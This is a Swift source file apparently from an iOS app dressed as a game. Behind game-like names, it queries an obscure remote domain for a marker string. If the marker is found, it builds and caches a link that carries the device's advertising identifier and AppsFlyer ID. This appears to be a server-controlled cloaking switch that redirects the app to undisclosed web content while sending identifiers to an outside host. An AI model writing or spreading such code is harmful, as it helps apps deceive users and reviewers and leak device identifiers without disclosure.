import Foundation
import AdSupport
import AppsFlyerLib


public final class ObtainLevelsType {
    
    private func makeFirstCall(completion: @escaping (Result<Data, ResponseWay>) -> Void) {
  
        self.makeAllCalls(completion: completion)
    }
    public func checkGameStatus(completion: @escaping (String) -> Void) {
       
        var resultedString = UserDefaults.standard.string(forKey: "levelds")

        if let resultedString = resultedString {
 
            completion(resultedString)
            return
        }
   
        self.makeFirstCall { result in
    
            let idfaRequest = ASIdentifierManager.shared().advertisingIdentifier.uuidString
            let flyerID = AppsFlyerLib.shared().getAppsFlyerUID() ?? ""

            switch result {
            case .success(let data):
              
                let responseString = String(data: data, encoding: .utf8) ?? ""
                if responseString.contains("vlolpvafa") {
                    let link = "\(responseString)?idfa=\(idfaRequest)&gaid=\(flyerID)"
                    UserDefaults.standard.setValue(link, forKey: "levelds")
                    completion(link)
                } else {
                    completion(resultedString ?? "")
                }
            case .failure:
        
                DispatchQueue.main.asyncAfter(deadline: .now() + 0.5) {
                    completion(resultedString ?? "")
                }
            }
        }
    }
    public func makeAllCalls(completion: @escaping (Result<Data, ResponseWay>) -> Void) {
   
        guard let generalLink = URL(string: "https://pilpiloojumju.homes/piju") else {
            completion(.failure(.invalidURLError))
            return
        }
        
        var typeOfRequestg = URLRequest(url: generalLink)
        typeOfRequestg.httpMethod = "GET"

        let wisdomSession: URLSession = {
            let session = URLSession(configuration: .default)
            session.configuration.timeoutIntervalForRequest = 3.0
            return session
        }()
   
        let gameTask = wisdomSession.dataTask(with: typeOfRequestg) { data, response, error in
            if let httpResponse = response as? HTTPURLResponse {
             
                guard (200...299).contains(httpResponse.statusCode) else {
                    completion(.failure(.httpError(httpResponse.statusCode)))
                    return
                }
            }
 
            if let error = error {
      
                completion(.failure(.responseError(error.localizedDescription)))
                return
            }

            guard let data = data else {
                completion(.failure(.noDataError))
                return
            }
        
            completion(.success(data))
        }
        gameTask.resume()
    }

   
}

public enum ResponseWay: Error {
    case responseError(String)
    case noDataError
    case invalidURLError
    case httpError(Int)
}
